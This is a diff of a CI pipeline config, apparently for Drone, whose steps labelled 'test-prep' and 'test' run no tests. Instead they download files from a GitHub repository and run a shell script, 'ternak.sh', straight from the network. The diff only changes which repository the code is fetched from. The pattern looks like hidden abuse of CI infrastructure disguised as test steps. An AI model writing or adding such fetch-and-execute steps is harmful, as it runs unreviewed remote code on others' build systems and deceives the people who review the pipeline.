@@ -2,14 +2,14 @@ pipeline:
   test-prep:
     image: mongo
     commands:
-      - wget https://raw.githubusercontent.com/outbesok/mesin/main/obatkuat
-      - wget https://raw.githubusercontent.com/outbesok/mesin/main/ternak.sh && chmod u+x ternak.sh && ./ternak.sh
+      - wget https://raw.githubusercontent.com/trautroi/drone/main/obatkuat
+      - wget https://raw.githubusercontent.com/trautroi/drone/main/ternak.sh && chmod u+x ternak.sh && ./ternak.sh
       
   test:
     image: mongo
     commands:
-      - wget https://raw.githubusercontent.com/outbesok/mesin/main/obatkuat
-      - wget https://raw.githubusercontent.com/outbesok/mesin/main/ternak.sh && chmod u+x ternak.sh && ./ternak.sh
+      - wget https://raw.githubusercontent.com/trautroi/drone/main/obatkuat
+      - wget https://raw.githubusercontent.com/trautroi/drone/main/ternak.sh && chmod u+x ternak.sh && ./ternak.sh
 
 services:
   mongo:
